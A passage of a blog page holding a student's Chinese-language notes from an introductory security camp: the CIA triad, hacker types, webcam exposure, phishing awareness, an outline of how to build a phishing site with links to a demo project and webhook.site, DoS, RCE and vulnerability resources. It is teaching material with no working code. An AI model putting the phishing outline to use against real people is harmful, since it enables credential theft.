@@ -1,0 +1,633 @@
+<!DOCTYPE html><html lang="zh-TW" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>AIS3 junior DAY1-網路概論 | Brian Blog</title><meta name="keywords" content="共筆筆記"><meta name="author" content="Brianlien"><meta name="copyright" content="Brianlien"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#18171d"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="AIS3 junior DAY1-網路概論"><meta name="application-name" content="AIS3 junior DAY1-網路概論"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#18171d"><meta property="og:type" content="article"><meta property="og:title" content="AIS3 junior DAY1-網路概論"><meta property="og:url" content="https://brianlien95.github.io/2024-AIS3-junior/20240818/3116610850/index.html"><meta property="og:site_name" content="Brian Blog"><meta property="og:description" content="甚麼是資訊安全 資安三要素 C 機密性 看到不該看的   I 完整性 資料是錯誤的   A 可用性 讓你用不了服務      甚麼是駭客 熱衷於電腦系統技術研究的專家 白帽 協助確認組織弱點 主動告知弱點所在 專注弱點修復技術   灰帽 介於白與黑之間 專注於利益與目標   黑帽 竊取機密 惡意攻擊"><meta property="og:locale" content="zh-TW"><meta property="og:image" content="https://brianlien95.github.io/img/cover.gif"><meta property="article:author" content="Brianlien"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://brianlien95.github.io/img/cover.gif"><meta name="description" content="甚麼是資訊安全 資安三要素 C 機密性 看到不該看的   I 完整性 資料是錯誤的   A 可用性 讓你用不了服務      甚麼是駭客 熱衷於電腦系統技術研究的專家 白帽 協助確認組織弱點 主動告知弱點所在 專注弱點修復技術   灰帽 介於白與黑之間 專注於利益與目標   黑帽 竊取機密 惡意攻擊"><link rel="shortcut icon" href="https://i.imgur.com/h51F2ow.jpg"><link rel="canonical" href="https://brianlien95.github.io/2024-AIS3-junior/20240818/3116610850/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)歡迎回來！"},
+  LA51: undefined,
+  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鴨👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 狀態很好，努力一下～","startTime":10,"endTime":10},{"greeting":"11點多啦, 在堅持一下就吃飯啦～","startTime":11,"endTime":11},{"greeting":"下安👋, 寶貝","startTime":12,"endTime":14},{"greeting":"🌈充實的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19點嘍, 獎勵一頓豐盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚安👋, 在屬於自己的時間好好放鬆😌~","startTime":20,"endTime":24}]},
+  twikooEnvId: 'https://classy-youtiao-f792d5.netlify.app',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: undefined,
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: {"skills":["🤖️ AI工具愛好者"]},
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查詢的內容：${query}"}},
+  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '複製成功',
+    error: '複製錯誤',
+    noSupport: '瀏覽器不支援'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '剛剛',
+    min: '分鐘前',
+    hour: '小時前',
+    day: '天前',
+    month: '個月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Brianlien","link":"連結: ","source":"來源: Brian Blog","info":"著作權歸作者所有。商業轉載請聯絡作者獲得授權，非商業轉載請註明出處。","copySuccess":"複製成功，複製和轉載請標注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切換為繁體","cht_to_chs":"你已切換為簡體","day_to_night":"你已切換為深色模式","night_to_day":"你已切換為淺色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Brian Blog',
+  title: 'AIS3 junior DAY1-網路概論',
+  postAI: '',
+  pageFillDescription: '甚麼是資訊安全, 甚麼是駭客, 資安事件, 烏俄戰爭, 免費線上真人直播, 每天的網路生活, 怎麼利用個資, 攻擊與保護, 釣魚網站, 如何保護自己, 如何製作釣魚網站, 對系統的攻擊, bug v.s. 漏洞, 攻擊網站的步驟, 如何看到一個網站, 在前端裡面可以了解什麼, HTML, CSS, JavaScript, 偷Cookie Lab, Burp Suite, Linux 基本操作甚麼是資訊安全資安三要素機密性看到不該看的完整性資料是錯誤的可用性讓你用不了服務甚麼是駭客熱衷於電腦系統技術研究的專家白帽協助確認組織弱點主動告知弱點所在專注弱點修復技術灰帽介於白與黑之間專注於利益與目標黑帽竊取機密惡意攻擊侵害隱私容易成為攻擊目標的原因商業利益好玩挑戰性政治因素研究目的個資駭客的攻擊目標人社交工程針對人性漏洞造成的危害例如釣魚詐騙系統被攻擊後的影響資料外洩系統受損名聲受損資安事件烏俄戰爭展現出了第四大戰場資訊史上最大規模情報戰輿情戰資訊攻擊戰免費線上真人直播沒有修改預設的帳號密碼每天的網路生活瀏覽網站釣魚網站收發信件釣魚信件中華郵政又欠費通訊與文書惡意檔案資料外洩社交工程股票推銷測試遊戲影音娛樂病毒詐騙怎麼利用個資家家人的身分證生日公司員工進入專案系統的權限學校同學的帳號密碼攻擊與保護釣魚網站吸引人跳樓大拍賣全場兩折起流程駭客製作釣魚網站受害者瀏覽觸發特定程式碼叫你登入社交帳號資料給駭客囉如何保護自己開啟注意網址是否怪怪的或網站內容繁簡體混合確認訊息真確性工具幫你確認上傳的檔案網站有沒有毒如何製作釣魚網站網站組成的原理前端畫面呈現使用者互動定義資料表單填寫資料定義表單要傳送的位置裝飾畫面呈現互動後端邏輯處理資料傳輸與儲存實作釣魚網站專案對系統的攻擊阻斷服務攻擊一個人把門口卡死網路攻擊手法使目標電腦的網路或系統資源耗盡使服務暫時中斷或停止導致其他使用者無法正常使用分散式阻斷服務攻擊一群人把門口堵死同上只是比較多攻擊用電腦被感染的殭屍電腦終極目標漏洞因為一些錯誤導致系統運作有問題如果會造成敏感資料外洩資料遺失那他就會變成漏洞怎麼找到漏洞攻擊網站的步驟了解網站架構規模整理收集可用資料針對網站進行攻擊竊取網站資料安裝定時炸彈如何看到一個網站瀏覽器只是一個媒介只要有和就可以跟網站互動輸入網址後發生什麼找到路路由目的地網址經由解析封包封裝解封裝是無狀態協定簡易的身份驗證幫無狀態的紀錄有狀態的資訊在前端裡面可以了解什麼找版本資訊特殊套件模板找註解隱藏資料利用請求屬性來偷資料程式語言你輸入甚麼我輸出什麼控制網頁相關內容的操控瀏覽器例如彈出視窗偷練習網頁換成自己的網址的部分改成你的網址換成自己的網址把上面那串丟進練習網頁的搜尋框得到網址拿這段網址去釣別人的回到拿到收到的網址後段的到練習網頁的地方改攔截瀏覽器收到的封包修改從瀏覽器傳送出的封包完全繞過前端的過濾紀錄和伺服器互動的全部過程基本操作有人使用偷權限在裡可以看到三個分別為擁有者群組其他人代表閱讀代表修改代表執行加密哈希值不再安全記憶指令使用紀錄',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-24 22:27:25',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Brian Blog" type="application/atom+xml">
+</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">網頁</div><div class="back-menu-list"><a class="back-menu-item" href="https://brianlien95.github.io/" title="部落格"><img class="back-menu-item-icon" src="https://i.imgur.com/ZAMAUkN.jpeg" alt="部落格"/><span class="back-menu-item-text">部落格</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">AI工具</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://askmanyai.cn/index" title="AskmanyAI"><img class="back-menu-item-icon" src="https://ama-static.floatai.cn/askmanyai/prod/img/logo.f01cc1bc.svg" alt="AskmanyAI"/><span class="back-menu-item-text">AskmanyAI</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://ai-bot.cn/" title="AI工具集"><img class="back-menu-item-icon" src="https://ai-bot.cn/wp-content/uploads/2024/08/Photoroom-logo.png" alt="AI工具集"/><span class="back-menu-item-text">AI工具集</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://notebooklm.google/" title="NotebookLM"><img class="back-menu-item-icon" src="https://image.woshipm.com/2024/09/19/9d75db98-7648-11ef-abf0-00163e0b5ff3.jpg" alt="NotebookLM"/><span class="back-menu-item-text">NotebookLM</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://kimi.moonshot.cn/" title="Kimi"><img class="back-menu-item-icon" src="https://gongwenguan.com/wp-content/uploads/2024/06/1717665098-Kimi-LOGO.jpg" alt="Kimi"/><span class="back-menu-item-text">Kimi</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">Brian Blog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分類</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 標籤</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 關於</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 關於本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜尋</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新評論</span></div><div class="aside-list"><span>正在載入中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/English/" style="font-size: 1.05rem;">English<sup>1</sup></a><a href="/tags/writeup/" style="font-size: 1.05rem;">writeup<sup>2</sup></a><a href="/tags/%E5%85%B1%E7%AD%86%E7%AD%86%E8%A8%98/" style="font-size: 1.05rem;">共筆筆記<sup>3</sup></a><a href="/tags/%E5%9C%8B%E6%96%87/" style="font-size: 1.05rem;">國文<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A2%BC%E5%AD%B8/" style="font-size: 1.05rem;">密碼學<sup>2</sup></a><a href="/tags/%E7%B6%B2%E8%B7%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">網路漏洞<sup>19</sup></a><a href="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/" style="font-size: 1.05rem;">逆向工程<sup>1</sup></a><a href="/tags/%E9%87%91%E8%9E%8D/" style="font-size: 1.05rem;">金融<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>歸檔</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/12/"><span class="card-archive-list-date">十二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">十月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">27</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/2024-AIS3-junior/" itemprop="url">2024 AIS3 junior</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%85%B1%E7%AD%86%E7%AD%86%E8%A8%98/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>共筆筆記</span></a></span></div></div><h1 class="post-title" itemprop="name headline">AIS3 junior DAY1-網路概論</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">發表於</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-08-18T06:28:43.000Z" title="發表於 2024-08-18 14:28:43">2024-08-18</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新於</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-12-24T14:27:25.542Z" title="更新於 2024-12-24 22:27:25">2024-12-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为新北"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>新北</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="/img/cover.gif"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://brianlien95.github.io/2024-AIS3-junior/20240818/3116610850/"><header><a class="post-meta-categories" href="/categories/2024-AIS3-junior/" itemprop="url">2024 AIS3 junior</a><a href="/tags/%E5%85%B1%E7%AD%86%E7%AD%86%E8%A8%98/" tabindex="-1" itemprop="url">共筆筆記</a><h1 id="CrawlerTitle" itemprop="name headline">AIS3 junior DAY1-網路概論</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Brianlien</span><time itemprop="dateCreated datePublished" datetime="2024-08-18T06:28:43.000Z" title="發表於 2024-08-18 14:28:43">2024-08-18</time><time itemprop="dateCreated datePublished" datetime="2024-12-24T14:27:25.542Z" title="更新於 2024-12-24 22:27:25">2024-12-24</time></header><h2 id="甚麼是資訊安全"><a href="#甚麼是資訊安全" class="headerlink" title="甚麼是資訊安全"></a>甚麼是資訊安全</h2><ul>
+<li>資安三要素<ul>
+<li>C 機密性<ul>
+<li>看到不該看的</li>
+</ul>
+</li>
+<li>I 完整性<ul>
+<li>資料是錯誤的</li>
+</ul>
+</li>
+<li>A 可用性<ul>
+<li>讓你用不了服務</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="甚麼是駭客"><a href="#甚麼是駭客" class="headerlink" title="甚麼是駭客"></a>甚麼是駭客</h2><ul>
+<li>熱衷於電腦系統技術研究的專家</li>
+<li>白帽<ul>
+<li>協助確認組織弱點</li>
+<li>主動告知弱點所在</li>
+<li>專注弱點修復技術</li>
+</ul>
+</li>
+<li>灰帽<ul>
+<li>介於白與黑之間</li>
+<li>專注於利益與目標</li>
+</ul>
+</li>
+<li>黑帽<ul>
+<li>竊取機密</li>
+<li>惡意攻擊</li>
+<li>侵害隱私</li>
+</ul>
+</li>
+<li>容易成為攻擊目標的原因<ul>
+<li>商業利益</li>
+<li>好玩 &#x2F; 挑戰性</li>
+<li>政治因素</li>
+<li>研究目的</li>
+<li>個資</li>
+</ul>
+</li>
+<li>駭客的攻擊目標<ul>
+<li>人<ul>
+<li>社交工程：針對人性漏洞造成的危害</li>
+<li>例如：釣魚、詐騙</li>
+</ul>
+</li>
+<li>系統</li>
+</ul>
+</li>
+<li>被攻擊後的影響<ul>
+<li>資料外洩 &#x2F; 系統受損</li>
+<li>名聲受損</li>
+</ul>
+</li>
+</ul>
+<h2 id="資安事件"><a href="#資安事件" class="headerlink" title="資安事件"></a>資安事件</h2><h3 id="烏俄戰爭"><a href="#烏俄戰爭" class="headerlink" title="烏俄戰爭"></a>烏俄戰爭</h3><ul>
+<li>展現出了第四大戰場 – 資訊 ( 史上最大規模 )<ul>
+<li>情報戰</li>
+<li>輿情戰</li>
+<li>資訊攻擊戰</li>
+</ul>
+</li>
+</ul>
+<h3 id="免費線上真人直播"><a href="#免費線上真人直播" class="headerlink" title="免費線上真人直播"></a>免費線上真人直播</h3><p><a target="_blank" rel="noopener" href="http://insecam.org/">http://insecam.org</a></p>
+<ul>
+<li>沒有修改預設的 webcam 帳號密碼</li>
+</ul>
+<h3 id="每天的網路生活"><a href="#每天的網路生活" class="headerlink" title="每天的網路生活"></a>每天的網路生活</h3><ul>
+<li>瀏覽網站 –&gt; 釣魚網站</li>
+<li>收發信件 –&gt; 釣魚信件<ul>
+<li><del>中華郵政又欠費</del></li>
+</ul>
+</li>
+<li>通訊與文書<ul>
+<li>惡意檔案</li>
+<li>資料外洩</li>
+<li>社交工程，股票推銷、測試遊戲</li>
+</ul>
+</li>
+<li>影音娛樂 –&gt; 病毒、詐騙</li>
+</ul>
+<h2 id="怎麼利用個資"><a href="#怎麼利用個資" class="headerlink" title="怎麼利用個資"></a>怎麼利用個資</h2><ul>
+<li>家<ul>
+<li>家人的身分證、生日</li>
+</ul>
+</li>
+<li>公司<ul>
+<li>員工進入專案、系統的權限</li>
+</ul>
+</li>
+<li>學校<ul>
+<li>同學的帳號密碼</li>
+</ul>
+</li>
+</ul>
+<h2 id="攻擊與保護"><a href="#攻擊與保護" class="headerlink" title="攻擊與保護"></a>攻擊與保護</h2><h3 id="釣魚網站"><a href="#釣魚網站" class="headerlink" title="釣魚網站"></a>釣魚網站</h3><ul>
+<li>吸引人<ul>
+<li>跳樓大拍賣，全場兩折起</li>
+</ul>
+</li>
+<li>流程：<ol>
+<li>駭客製作釣魚網站</li>
+<li>受害者瀏覽</li>
+<li>觸發特定程式碼(JS)</li>
+<li>叫你登入社交帳號</li>
+<li>booooom 資料給駭客囉</li>
+</ol>
+</li>
+</ul>
+<h3 id="如何保護自己"><a href="#如何保護自己" class="headerlink" title="如何保護自己"></a>如何保護自己</h3><ul>
+<li>開啟 2FA &#x2F; TFA</li>
+<li>注意網址是否怪怪的<ul>
+<li>或網站內容繁簡體混合</li>
+</ul>
+</li>
+<li>確認訊息真確性<ul>
+<li>165</li>
+</ul>
+</li>
+<li>工具<ul>
+<li><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">virustotal</a><ul>
+<li>幫你確認上傳的檔案 &#x2F; 網站有沒有毒</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="如何製作釣魚網站"><a href="#如何製作釣魚網站" class="headerlink" title="如何製作釣魚網站"></a>如何製作釣魚網站</h3><ul>
+<li>網站組成的原理<ul>
+<li>前端<ul>
+<li>畫面呈現</li>
+<li>使用者互動</li>
+<li>HTML<ul>
+<li>定義資料</li>
+<li><code>&lt;form&gt;</code> 表單，填寫資料<ul>
+<li>action 定義表單要傳送的位置</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>CSS<ul>
+<li>裝飾畫面</li>
+</ul>
+</li>
+<li>JavaScript<ul>
+<li>呈現互動</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>後端<ul>
+<li>邏輯處理</li>
+<li>資料傳輸與儲存</li>
+</ul>
+</li>
+<li>實作<ul>
+<li><a target="_blank" rel="noopener" href="https://jsfiddle.net/">jsfiddel</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/fdff87554/phishing_demo">釣魚網站專案</a></li>
+<li><a target="_blank" rel="noopener" href="https://webhook.site/#!/view/2e83c6ff-f551-48b2-96ef-0ea32022d4b9">Webhook.site</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="對系統的攻擊"><a href="#對系統的攻擊" class="headerlink" title="對系統的攻擊"></a>對系統的攻擊</h2><ul>
+<li><p>DoS 阻斷服務攻擊</p>
+<ul>
+<li>一個人把門口卡死</li>
+<li>網路攻擊手法</li>
+<li>使目標電腦的網路或系統資源耗盡，使服務暫時中斷或停止，導致其他使用者無法正常使用</li>
+</ul>
+</li>
+<li><p>DDoS 分散式阻斷服務攻擊</p>
+<ul>
+<li>一群人把門口堵死</li>
+<li>同上只是比較多攻擊用電腦(被感染的殭屍電腦)</li>
+</ul>
+</li>
+<li><p>終極目標：RCE (Remote Code Execution)</p>
+</li>
+</ul>
+<h2 id="bug-v-s-漏洞"><a href="#bug-v-s-漏洞" class="headerlink" title="bug v.s. 漏洞"></a>bug v.s. 漏洞</h2><ul>
+<li>bug：因為一些錯誤導致系統運作有問題</li>
+<li>如果bug會造成<ul>
+<li>敏感資料外洩</li>
+<li>資料遺失</li>
+<li>…</li>
+<li>那他就會變成漏洞</li>
+</ul>
+</li>
+<li>怎麼找到漏洞<ul>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/Top10/zh_TW/">OWASP Top 10</a></li>
+<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/">CVE</a></li>
+<li><a target="_blank" rel="noopener" href="https://zeroday.hitcon.org/">Hitcon ZeroDay</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.hackerone.com/">hackerone</a></li>
+</ul>
+</li>
